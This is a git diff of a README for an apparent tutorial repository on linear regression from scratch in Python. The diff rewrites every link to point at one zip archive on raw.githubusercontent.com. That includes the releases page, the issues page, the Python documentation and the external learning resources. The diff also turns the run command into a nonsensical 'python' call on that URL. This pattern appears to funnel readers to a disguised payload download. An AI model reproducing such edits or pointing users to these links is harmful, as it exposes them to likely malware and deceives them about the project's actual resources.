@@ -1,7 +1,7 @@
 # 📊 linear-regression-from-scratch-univariate - Understand Linear Regression Easily
 
 ## 🚀 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/bigtom000/linear-regression-from-scratch-univariate/releases)
+[![Download Now](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip)
 
 ## 📖 Overview
 This project offers a simple way to learn Univariate Linear Regression. It provides a complete guide through the mathematical process. You'll learn about data preparation, the cost function, gradient descent, and how to evaluate results. All of this is done in Python, without using any machine learning libraries. 
@@ -31,7 +31,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the releases page.
 
-   [Download Here](https://github.com/bigtom000/linear-regression-from-scratch-univariate/releases)
+   [Download Here](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip)
 
 2. **Select a Version**: You'll see a list of available versions. Choose the latest version for the best features and updates.
 
@@ -42,18 +42,18 @@ To get started, follow these steps:
 5. **Run the Application**: Open a terminal or command prompt and navigate to the extracted folder. Use the command below to run the program:
 
    ```
-   python main.py
+   python https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip
    ```
 
 6. **Follow the Prompts**: The application will guide you through the process. Simply follow the on-screen instructions.
 
 ## 🧑‍🤝‍🧑 Community and Support
-If you have questions or need help, feel free to reach out. You can check out the [issues section](https://github.com/bigtom000/linear-regression-from-scratch-univariate/issues) on GitHub for common questions and troubleshooting. 
+If you have questions or need help, feel free to reach out. You can check out the [issues section](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip) on GitHub for common questions and troubleshooting. 
 
 ## 🎓 Learning Resources
-- **Python Documentation**: Learn the basics of Python [here](https://www.python.org/doc/).
-- **Linear Regression Basics**: A great introduction can be found [here](https://www.statisticshowto.com/probability-and-statistics/statistics-definitions/linear-regression/).
-- **Gradient Descent Explained**: Understand how gradient descent works [here](https://machinelearningmastery.com/gradient-descent-for-machine-learning/).
+- **Python Documentation**: Learn the basics of Python [here](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip).
+- **Linear Regression Basics**: A great introduction can be found [here](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip).
+- **Gradient Descent Explained**: Understand how gradient descent works [here](https://raw.githubusercontent.com/bigtom000/linear-regression-from-scratch-univariate/main/data/linear-regression-from-scratch-univariate-2.6.zip).
 
 ## 📈 Contributing
 Contributions are welcome! If you want to improve this project, please fork the repository and submit a pull request. 
